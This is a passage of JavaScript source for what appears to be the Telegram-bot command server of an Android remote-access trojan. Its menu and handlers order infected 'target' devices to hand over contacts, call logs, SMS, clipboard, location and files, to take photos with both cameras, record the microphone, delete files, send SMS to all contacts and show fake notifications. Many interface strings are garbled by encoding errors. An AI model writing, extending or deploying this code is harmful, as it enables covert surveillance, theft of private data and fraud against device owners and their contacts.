                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '° 1�7 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴄ1�7 ᴛᴏ ꜱᴇɴᴄ1�7 ꜱᴍ꜄1�7 ᴛᴏ ʟᴏᴄᴄ1�7ʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʄ1�7꜄1�7, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ɴᴜᴍʙᴇʄ1�7 ᴡɪᴛʜ ᴢᴇʀᴄ1�7 ᴄ1�7ᴄ1�7 ᴛʜᴇ ʙᴇɢɪɴɴɪɴɄ1�7, ᴏᴛʜᴇʄ1�7ᴡɪꜱᴄ1�7 ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ɴᴜᴍʙᴇʄ1�7 ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            ' 1�7 ʙᴄ1�7 ᴄᴀʀᴇꜰᴜʄ1�7 ᴛʜᴀᴄ1�7 ᴛʜᴇ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ᴡɪʟʄ1�7 ɴᴏᴛ ʙᴄ1�7 ꜱᴇɴᴄ1�7 ɪ꜄1�7 ᴛʜᴇ ɴᴜᴍʙᴇʄ1�7 ᴏꜰ ᴄʜᴀʀᴄ1�7ᴄᴛᴇʄ1�7꜄1�7 ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ɪ꜄1�7 ᴍᴏʀᴄ1�7 ᴛʜᴀɴ ᴄ1�7ʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            ' 1�7 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴄ1�7 ᴛᴏ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʄ1�7, ᴊᴜꜱᴛ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʄ1�7. ꜰᴏʀ ᴇxᴄ1�7ᴍᴘʟᴄ1�7, ᴇɴᴛᴇʄ1�7<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴄ1�7 ɢᴄ1�7ʟʟᴇʄ1�7ʏ ꜰɪʟᴇ꜄1�7.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            ' 1�7 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴄ1�7 ᴛᴏ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʄ1�7, ᴊᴜꜱᴛ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʄ1�7. ꜰᴏʀ ᴇxᴄ1�7ᴍᴘʟᴄ1�7, ᴇɴᴛᴇʄ1�7<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴄ1�7 ɢᴄ1�7ʟʟᴇʄ1�7ʏ ꜰɪʟᴇ꜄1�7.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            ' 1�7 ɴᴏᴛᴄ1�7 ᴛʜᴀᴄ1�7 ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ᴛɪᴍᴄ1�7 ɴᴜᴍᴇʄ1�7ɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛ꜄1�7 ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            ' 1�7 ᴛᴏᴄ1�7ꜱᴛ ɪ꜄1�7 ᴄ1�7 ꜱʜᴏʀᴄ1�7 ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ᴛʜᴀᴄ1�7 ᴄ1�7ᴘᴘᴇᴀʀ꜄1�7 ᴏɄ1�7 ᴛʜᴇ ᴅᴇᴠɪᴄᴄ1�7 ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴄ1�7 ꜰᴇᴄ1�7 ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            ' 1�7 ʏᴏᴜʀ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ᴡɪʟʄ1�7 ʙᴄ1�7 ᴄ1�7ᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴄ1�7 ꜱᴛᴄ1�7ᴛᴜ꜄1�7 ʙᴄ1�7ʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴄ1�7ʀ ɴᴏᴛɪꜰɪᴄᴄ1�7ᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            ' 1�7 ɴᴏᴛᴄ1�7 ᴛʜᴀᴄ1�7 ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʄ1�7 ᴛʜᴇ ᴅɪʄ1�7ᴇᴄᴄ1�7 ʟɪɴᴄ1�7 ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʄ1�7ᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʄ1�7ᴡɪꜱᴄ1�7 ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʄ1�7 ɴᴏᴛ ʙᴄ1�7 ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);